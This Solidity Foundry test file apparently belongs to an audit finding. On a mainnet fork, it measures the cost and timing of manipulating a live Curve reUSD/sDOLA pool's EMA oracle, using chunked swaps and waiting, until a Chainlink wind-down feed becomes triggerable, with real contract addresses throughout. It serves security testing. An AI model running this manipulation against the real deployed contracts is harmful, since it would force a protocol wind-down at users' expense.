// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20, ICurvePoolNG, IWindDownFeed, IFeed} from "../src/Interfaces.sol";

/// L-1 arm 1: trigger-cost measurement for ChainlinkCurveWindDownFeed.
/// Local mainnet fork only. No mainnet transactions are ever sent.
///
/// Pool EMA mechanics (CurveStableSwapNG.vy, verified source):
///   price_oracle(i) [view] = last_spot*(1-a) + stored_ema*a, a = exp(-dt/ma_exp_time)
///   recorded spot is capped: min(spot, 2e18) on every upkeep (exchange etc.)
///   ma_exp_time = 866 on the live pool -> EMA converges to the LAST spot with
///   a ~10 minute half-life, with NO further trades required.
contract L1TriggerTest is Test {
    uint256 constant FORK_BLOCK = 26436361;

    address constant POOL = 0xc522A6606BBA746d7960404F22a3DB936B6F4F50; // reUSD/sDOLA EMA pool
    address constant REUSD = 0x57aB1E0003F623289CD798B1824Be09a793e4Bec;
    address constant SDOLA = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367;
    address constant FEED = 0xF2687C32c03c1B4a52015a029C58f99DC851eFC0;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;

    address attacker = address(0xA77AC6);
    address keeper = address(0xB0B);

    ICurvePoolNG pool = ICurvePoolNG(POOL);
    IWindDownFeed feed = IWindDownFeed(FEED);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        deal(REUSD, attacker, 40_000_000 ether);
        vm.prank(attacker);
        IERC20(REUSD).approve(POOL, type(uint256).max);
    }

    /// Push the pool spot to the 2e18 recording cap with chunked swaps.
    /// Returns (reUSD spent, sDOLA received).
    function _pushToCap() internal returns (uint256 spent, uint256 received) {
        uint256 chunk = 100_000 ether;
        for (uint256 i = 0; i < 400; i++) {
            if (pool.last_price(0) >= 1.999e18) break;
            vm.prank(attacker);
            received += pool.exchange(0, 1, chunk, 0);
            spent += chunk;
        }
        require(pool.last_price(0) >= 1.999e18, "could not reach cap");
    }

    /// A flash-loaned single-block push cannot trigger: within one block the
    /// EMA does not move at all (dt = 0 -> alpha = 1), and after one 12s block
    /// it has moved only ~1.4% of the gap to the capped spot.
    function test_FlashPushSingleBlock_Insufficient() public {
        uint256 ema0 = pool.price_oracle(0);
        console.log("EMA before push:", ema0);

        (uint256 spent, uint256 received) = _pushToCap();
        console.log("reUSD spent to reach cap:", spent);
        console.log("sDOLA received:", received);
        console.log("last_price(0) recorded (capped):", pool.last_price(0));
        assertEq(pool.last_price(0), 2e18, "spot recording must be capped at 2e18");

        uint256 emaSameBlock = pool.price_oracle(0);
        console.log("EMA same block after push:", emaSameBlock);
        assertEq(emaSameBlock, ema0, "EMA must not move within the same block");
        assertFalse(feed.canStartWindDown(), "must not be triggerable in-block");

        vm.warp(block.timestamp + 12);
        vm.roll(block.number + 1);
        uint256 emaPlus12s = pool.price_oracle(0);
        console.log("EMA after +12s:", emaPlus12s);
        assertLt(emaPlus12s, 1.03e18, "one block of convergence is negligible");
        assertFalse(feed.canStartWindDown(), "must not be triggerable after 1 block");
    }

    /// Full no-arbitrage trigger: one dislocation campaign, then pure waiting.
    /// Measures time-to-trigger, third-party activation, and the round-trip
    /// (unwind) cost borne by the attacker.
    function test_TriggerCost_NoArb_And_Unwind() public {
        uint256 reBefore = IERC20(REUSD).balanceOf(attacker);

        (uint256 spent, uint256 received) = _pushToCap();
        console.log("== dislocation ==");
        console.log("reUSD spent:", spent);
        console.log("sDOLA received:", received);
        console.log("avg execution price (reUSD per sDOLA):", spent * 1e18 / received);
        console.log("pool sDOLA balance after push:", pool.balances(1));
        console.log("pool reUSD balance after push:", pool.balances(0));

        // Wait for the EMA view to converge to >= 1.9e18. No trades at all.
        uint256 t0 = block.timestamp;
        uint256 elapsed = 0;
        while (!feed.canStartWindDown() && elapsed < 3 hours) {
            vm.warp(block.timestamp + 60);
            vm.roll(block.number + 5);
            elapsed = block.timestamp - t0;
            if (elapsed % 300 == 0) {
                console.log("t+ (s):", elapsed, " EMA:", pool.price_oracle(0));
            }
        }
        console.log("== trigger ==");
        console.log("time to trigger (s):", elapsed);
        assertTrue(feed.canStartWindDown(), "wind-down must become triggerable");

        // A completely unrelated third party activates and collects the reward.
        uint256 keeperDolaBefore = IERC20(DOLA).balanceOf(keeper);
        vm.prank(keeper);
        feed.startWindDown();
        console.log("windDownStartPrice:", feed.windDownStartPrice());
        console.log("keeper DOLA reward:", IERC20(DOLA).balanceOf(keeper) - keeperDolaBefore);
        assertGt(feed.windDownStartPrice(), 0.5e18);
        assertLt(feed.windDownStartPrice(), 0.53e18);

        // Attacker unwinds immediately: sells every sDOLA back into the pool.
        uint256 sdolaBal = IERC20(SDOLA).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(SDOLA).approve(POOL, type(uint256).max);
        pool.exchange(1, 0, sdolaBal, 0);
        vm.stopPrank();

        uint256 reAfter = IERC20(REUSD).balanceOf(attacker);
        console.log("== unwind ==");
        console.log("attacker reUSD before:", reBefore);
        console.log("attacker reUSD after unwind:", reAfter);
        console.log("attacker sDOLA dust left:", IERC20(SDOLA).balanceOf(attacker));
        console.log("NET ROUND-TRIP COST (reUSD):", reBefore - reAfter);
        console.log("pool price_oracle(0) after unwind:", pool.price_oracle(0));
        console.log("pool last_price(0) after unwind:", pool.last_price(0));
    }
}
